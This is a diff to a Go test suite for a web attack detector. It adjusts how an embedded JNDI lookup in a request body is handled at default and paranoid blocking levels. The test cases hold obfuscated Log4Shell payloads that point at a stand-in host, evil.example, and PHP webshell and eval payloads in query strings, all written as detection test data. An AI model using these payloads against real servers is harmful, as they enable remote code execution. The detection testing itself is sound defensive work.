@@ -47,7 +47,6 @@ func TestRecallHardeningDetectsCompleteAttackShapes(t *testing.T) {
 		{"jndi-env-default", http.MethodGet, "/x?q=${${env:BARFOO:-j}ndi:ldap://evil.example/a}", "", "", "log4shell"},
 		{"jndi-letterwise", http.MethodGet, "/x?q=${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.example/a}", "", "", "log4shell"},
 		{"jndi-date-literal", http.MethodGet, "/x?q=${${date:'j'}ndi:ldap://evil.example/a}", "", "", "log4shell"},
-		{"jndi-body-exact", http.MethodPost, "/api/articles", "text/plain", "note ${jndi:ldap://evil.example/a} in logs", "log4shell"},
 		{"php-callback-query", http.MethodGet, "/index.php?a=system&b=ls&code=$_GET[a]($_GET[b])", "", "", "webshell"},
 		{"php-eval-get-query", http.MethodGet, "/index.php?x=@eval($_GET[_]);", "", "", "webshell"},
 		{"php-eval-post-query", http.MethodGet, "/?s=/{${eval($_POST[u])}}", "", "", "webshell"},
@@ -116,6 +115,31 @@ func TestRecallHardeningQuotedOrIgnoresEnglishAlternatives(t *testing.T) {
 		if !quotedOrPredicateInjection(payload) {
 			t.Fatalf("missed quoted OR injection %q", payload)
 		}
+	}
+}
+
+func TestRecallHardeningEmbeddedJNDINotBlockedAtDefault(t *testing.T) {
+	got := detectRecall(t, http.MethodPost, "/api/articles", "text/plain",
+		"note ${jndi:ldap://evil.example/a} in logs")
+	if got != nil && got.Detected {
+		t.Fatalf("embedded JNDI must not block at default: cat=%s", got.Category)
+	}
+}
+
+func TestRecallHardeningEmbeddedJNDIBlockedAtParanoid(t *testing.T) {
+	req := httptest.NewRequest(http.MethodPost, "http://x/api/articles", strings.NewReader("note ${jndi:ldap://evil.example/a} in logs"))
+	req.Header.Set("Content-Type", "text/plain")
+	reqCtx, err := engine.NewRequestContext(req, "default")
+	if err != nil {
+		t.Fatal(err)
+	}
+	reqCtx.DecodedBody = []byte("note ${jndi:ldap://evil.example/a} in logs")
+	got, err := NewAnalyzer("block", 5).Detect(context.Background(), reqCtx)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got == nil || !got.Detected || got.Category != "log4shell" {
+		t.Fatalf("embedded JNDI should still block at the strictest shipped level: %+v", got)
 	}
 }
 
